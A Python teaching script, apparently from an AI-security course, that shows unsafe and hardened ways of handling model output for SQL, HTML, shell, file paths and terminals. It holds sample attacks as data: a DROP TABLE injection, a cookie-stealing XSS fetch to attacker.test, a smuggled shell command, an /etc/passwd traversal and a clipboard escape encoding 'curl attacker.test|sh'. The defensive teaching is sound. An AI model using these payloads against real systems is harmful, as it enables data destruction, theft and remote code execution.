"""Part 10: Improper Output Handling (LLM10:2026).

Five places model output lands, each handled twice: the way it often ships
and the way it should. The attacks are real but harmless: the "injected"
shell command only echoes a line, and the database is in memory.

Run:  python parts/p10_improper_output_handling.py   (macOS / Linux)
"""

import sqlite3
import subprocess
import tempfile
from pathlib import Path

from ai_owasp.output import neutralise, render_html, run_intent, safe_path
from ai_owasp.show import heading


def fresh_db():
    db = sqlite3.connect(":memory:")
    db.executescript("""
    CREATE TABLE orders(id TEXT, status TEXT);
    INSERT INTO orders VALUES ('ORD-1042', 'shipped'), ('ORD-1043', 'packed');
    """)
    return db


def tables(db):
    return [r[0] for r in db.execute(
        "SELECT name FROM sqlite_master WHERE type='table'")]


# --- 1. SQL ----------------------------------------------------------------
heading("1. Text-to-SQL: the model writes the query")
model_sql = ("SELECT id, status FROM orders WHERE id = 'ORD-1042'; "
             "DROP TABLE orders; --")
db = fresh_db()
db.executescript(model_sql)
print("as shipped (executescript): tables left:", tables(db))

db = fresh_db()
db.execute("PRAGMA query_only = ON")
try:
    db.executescript(model_sql)
except sqlite3.OperationalError as e:
    print("read-only connection:       ", e)
    print("                             tables left:", tables(db))

db = fresh_db()
model_json = '{"intent": "order_status", "order_id": "ORD-1042"}'
print("intent + parameters:        ", run_intent(db, model_json))
evil_json = ('{"intent": "order_status", '
             '"order_id": "ORD-1042\' OR 1=1 --"}')
try:
    run_intent(db, evil_json)
except ValueError as e:
    print("intent + injected id:       ", e)

# --- 2. HTML ---------------------------------------------------------------
heading("2. A chat answer rendered in the browser")
answer = ("Here is your summary. <img src=x onerror=\"fetch('https://"
          "attacker.test/c?'+document.cookie)\">")
print("as shipped: <div class='answer'>" + answer[:44] + "...")
print("encoded:   ", render_html(answer)[:70] + "...")

# --- 3. Shell ----------------------------------------------------------------
heading("3. The model names the file to archive")
name = "q3-report.txt; echo INJECTED COMMAND RAN"
out = subprocess.run(f"echo archiving {name}", shell=True,
                     capture_output=True, text=True).stdout.splitlines()
print("shell=True:  ", out)
out = subprocess.run(["echo", "archiving", name],
                     capture_output=True, text=True).stdout.splitlines()
print("argument list:", out)

# --- 4. File paths -----------------------------------------------------------
heading("4. The model picks which report to open")
with tempfile.TemporaryDirectory() as tmp:
    base = Path(tmp) / "reports"
    base.mkdir()
    for candidate in ("q3-summary.txt", "../../etc/passwd"):
        try:
            p = safe_path(base, candidate)
            print(f"  {candidate:<18} -> reports/{p.name}")
        except PermissionError as e:
            print(f"  {candidate:<18} -> refused: {e}")

# --- 5. Terminals and log viewers --------------------------------------------
heading("5. Model output written to a terminal or log viewer")
spoof = ("Deploy finished: 0 errors\x1b[2K\r"
         "Deploy finished: all checks passed"
         "\x1b]52;c;Y3VybCBhdHRhY2tlci50ZXN0fHNo\x07")
print("what a human sees in the terminal:")
print("  Deploy finished: all checks passed")
print("what the bytes actually are, neutralised:")
for part in neutralise(spoof).replace("\\x0d", "\\x0d\n").splitlines():
    print("  " + part)
